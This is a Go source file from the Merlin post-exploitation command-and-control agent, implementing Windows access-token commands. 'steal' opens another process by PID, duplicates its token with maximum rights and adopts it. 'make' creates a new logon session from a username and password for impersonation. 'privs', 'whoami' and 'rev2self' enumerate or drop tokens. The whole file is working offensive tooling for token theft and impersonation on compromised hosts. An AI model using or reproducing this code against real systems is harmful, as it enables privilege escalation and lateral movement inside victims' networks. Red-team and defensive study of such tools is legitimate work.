//go:build windows

/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package commands

import (
	// Standard
	"fmt"
	"os"
	"strconv"
	"strings"

	// X Packages
	"golang.org/x/sys/windows"

	// Merlin Main
	"github.com/Ne0nd0g/merlin-message/jobs"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/v2/cli"
	"github.com/Ne0nd0g/merlin-agent/v2/os/windows/pkg/tokens"
)

// Token is the entrypoint for Jobs that are processed to determine which Token function should be executed
func Token(cmd jobs.Command) jobs.Results {
	cli.Message(cli.DEBUG, fmt.Sprintf("entering Token() with %+v", cmd))

	if len(cmd.Args) > 0 {
		switch strings.ToLower(cmd.Args[0]) {
		case "make":
			if len(cmd.Args) < 3 {
				return jobs.Results{
					Stderr: fmt.Sprintf("not enough arguments %d for the token make command", len(cmd.Args)),
				}
			}
			return makeToken(cmd.Args[1], cmd.Args[2])
		case "privs":
			if len(cmd.Args) > 1 {
				return listPrivileges(cmd.Args[1])
			} else {
				return listPrivileges("0")
			}
		case "rev2self":
			return rev2self()
		case "steal":
			if len(cmd.Args) < 2 {
				return jobs.Results{
					Stderr: "A Process ID (PID) must be provided for the token steal command",
				}
			}
			pid, err := strconv.Atoi(cmd.Args[1])
			if err != nil {
				return jobs.Results{
					Stderr: fmt.Sprintf("there was an error converting PID %s to an integeter: %s", cmd.Args[1], err),
				}
			}
			return stealToken(uint32(pid))
		case "whoami":
			return whoami()
		default:
			j := jobs.Results{
				Stderr: fmt.Sprintf("unrecognized Windows Access Token command: %s", cmd.Args[0]),
			}
			return j
		}
	}
	j := jobs.Results{
		Stderr: "no arguments were provided to the Windows Access Token module",
	}
	return j
}

// All functions in this file should return jobs.Results, else the function should go in os\windows\pkg\tokens

// listPrivileges will enumerate the privileges associated with a Windows access token
// If the Process ID (pid) is 0, then the privileges for the token associated with current process will be enumerated
func listPrivileges(processID string) (results jobs.Results) {
	// Convert PID from string to int
	pid, err := strconv.Atoi(processID)
	if err != nil {
		results.Stderr = fmt.Sprintf("there was an error converting %s to an integer: %s", processID, err)
		return
	}

	var token windows.Token

	if pid == 0 && tokens.Token != 0 {
		pid = os.Getpid()
		token = tokens.Token
		results.Stdout += "Enumerating privileges using previously stolen or created Windows access token\n"
	} else {
		if pid == 0 {
			pid = os.Getpid()
		}
		// Get a handle to the current process
		var hProc windows.Handle
		hProc, err = windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, uint32(pid))
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error calling windows.OpenProcess(): %s", err)
			return
		}

		// Close the handle when done
		defer func() {
			err2 := windows.CloseHandle(hProc)
			if err2 != nil {
				results.Stderr += fmt.Sprintf("there was an error calling windows.CloseHandle() for the process: %s\n", err2)
			}
		}()

		// Use process handle to get a token
		err = windows.OpenProcessToken(hProc, windows.TOKEN_QUERY, &token)
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error calling windows.OpenProcessToken(): %s", err)
			return
		}

		// Close the handle when done
		defer func() {
			err2 := token.Close()
			if err2 != nil {
				results.Stderr += fmt.Sprintf("there was an error calling token.Close(): %s\n", err2)
			}
		}()
	}

	// Get token integrity level
	integrityLevel, err := tokens.GetTokenIntegrityLevel(token)
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	// Get the privileges and attributes
	privs, err := tokens.GetTokenPrivileges(token)
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	results.Stdout += fmt.Sprintf("Process ID %d access token integrity level: %s, privileges (%d):\n", pid, integrityLevel, len(privs))

	for _, priv := range privs {
		results.Stdout += fmt.Sprintf("\tPrivilege: %s, Attribute: %s\n", tokens.PrivilegeToString(priv.Luid), tokens.PrivilegeAttributeToString(priv.Attributes))
	}
	return
}

// makeToken creates a new type 9 logon session for the provided user and applies the returned Windows access token to
// the current process using the ImpersonateLoggedOnUser Windows API call
func makeToken(username, password string) (results jobs.Results) {
	// Make token
	token, err := tokens.LogonUser(username, password, "", tokens.LOGON32_LOGON_NEW_CREDENTIALS, tokens.LOGON32_PROVIDER_DEFAULT)
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	tokens.Token = token

	// Get Token Stats
	stats, err := tokens.GetTokenStats(token)
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	results.Stdout = fmt.Sprintf("Successfully created a Windows access token for %s with a logon ID of 0x%X", username, stats.AuthenticationId.LowPart)

	return
}

// rev2self releases or drops any impersonation tokens applied to the current process, reverting to its original state
func rev2self() (results jobs.Results) {
	tokens.Token = 0
	err := windows.RevertToSelf()
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	results.Stdout = "Successfully reverted to self and dropped the impersonation token"
	return
}

// stealToken is a wrapper function that steals a token and applies it to the current process
func stealToken(pid uint32) (results jobs.Results) {
	if pid == 0 {
		results.Stderr = fmt.Sprintf("invalid Process ID (PID) of %d", pid)
		return
	}

	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, pid)
	if err != nil {
		results.Stderr = fmt.Sprintf("there was an error calling kernel32!OpenProcess: %s", err)
		return
	}

	// Defer closing the process handle
	defer func() {
		err = windows.Close(handle)
		if err != nil {
			results.Stderr += fmt.Sprintf("\n%s", err)
		}
	}()

	// Use the process handle to get its access token

	// These token privs are required to call CreateProcessWithToken or later
	DesiredAccess := windows.TOKEN_DUPLICATE | windows.TOKEN_ASSIGN_PRIMARY | windows.TOKEN_QUERY

	var token windows.Token
	err = windows.OpenProcessToken(handle, uint32(DesiredAccess), &token)
	if err != nil {
		results.Stderr = fmt.Sprintf("there was an error calling advapi32!OpenProcessToken: %s", err)
		return
	}

	// Duplicate the token with maximum permissions
	var dupToken windows.Token
	err = windows.DuplicateTokenEx(token, windows.MAXIMUM_ALLOWED, &windows.SecurityAttributes{}, windows.SecurityImpersonation, windows.TokenPrimary, &dupToken)
	if err != nil {
		results.Stderr = fmt.Sprintf("there was an error calling windows.DuplicateTokenEx: %s", err)
		return
	}

	tokens.Token = dupToken

	// Get Thread Token TOKEN_STATISTICS structure
	statThread, err := tokens.GetTokenStats(tokens.Token)
	if err != nil {
		return
	}

	// Get Thread Username
	userThread, err := tokens.GetTokenUsername(tokens.Token)
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	results.Stdout = fmt.Sprintf("Successfully stole token from PID %d for user %s with LogonID 0x%X", pid, userThread, statThread.AuthenticationId.LowPart)
	return
}

// whoami enumerates information about both the process and thread token currently being used
func whoami() (results jobs.Results) {
	// Process
	tProc := windows.GetCurrentProcessToken()

	// Get Process Username
	userProc, err := tokens.GetTokenUsername(tProc)
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	// Get Process Token TOKEN_STATISTICS structure
	statProc, err := tokens.GetTokenStats(tProc)
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	results.Stdout += fmt.Sprintf("Process (%s) Token:\n", tokens.TokenTypeToString(statProc.TokenType))
	results.Stdout += fmt.Sprintf("\tUser: %s", userProc)
	results.Stdout += fmt.Sprintf(",Token ID: 0x%X", statProc.TokenId.LowPart)
	results.Stdout += fmt.Sprintf(",Logon ID: 0x%X", statProc.AuthenticationId.LowPart)
	results.Stdout += fmt.Sprintf(",Privilege Count: %d", statProc.PrivilegeCount)
	results.Stdout += fmt.Sprintf(",Group Count: %d", statProc.GroupCount)
	results.Stdout += fmt.Sprintf(",Type: %s", tokens.TokenTypeToString(statProc.TokenType))
	results.Stdout += fmt.Sprintf(",Impersonation Level: %s", tokens.ImpersonationToString(statProc.ImpersonationLevel))

	// Process Token Integrity Level
	pLevel, err := tokens.GetTokenIntegrityLevel(tProc)
	if err != nil {
		results.Stderr = err.Error()
		return
	}
	results.Stdout += fmt.Sprintf(",Integrity Level: %s", pLevel)

	// Thread
	var tThread windows.Token
	// Lost the fight against the Go runtime managing threads, so I can't depend on this thread having the token
	if tokens.Token != 0 {
		tThread = tokens.Token
	} else {
		tThread = windows.GetCurrentThreadEffectiveToken()
		//tThread = windows.GetCurrentThreadToken()
	}

	// Get Thread Token TOKEN_STATISTICS structure
	statThread, err := tokens.GetTokenStats(tThread)
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	// Get Thread Username
	userThread, err := tokens.GetTokenUsername(tThread)
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	results.Stdout += fmt.Sprintf("\nThread (%s) Token:\n", tokens.TokenTypeToString(statThread.TokenType))
	results.Stdout += fmt.Sprintf("\tUser: %s", userThread)
	results.Stdout += fmt.Sprintf(",Token ID: 0x%X", statThread.TokenId.LowPart)
	results.Stdout += fmt.Sprintf(",Logon ID: 0x%X", statThread.AuthenticationId.LowPart)
	results.Stdout += fmt.Sprintf(",Privilege Count: %d", statThread.PrivilegeCount)
	results.Stdout += fmt.Sprintf(",Group Count: %d", statThread.GroupCount)
	results.Stdout += fmt.Sprintf(",Type: %s", tokens.TokenTypeToString(statThread.TokenType))
	results.Stdout += fmt.Sprintf(",Impersonation Level: %s", tokens.ImpersonationToString(statThread.ImpersonationLevel))

	// Process Token Integrity Level
	tLevel, err := tokens.GetTokenIntegrityLevel(tThread)
	if err == nil {
		results.Stdout += fmt.Sprintf(",Integrity Level: %s", tLevel)
	}

	return
}
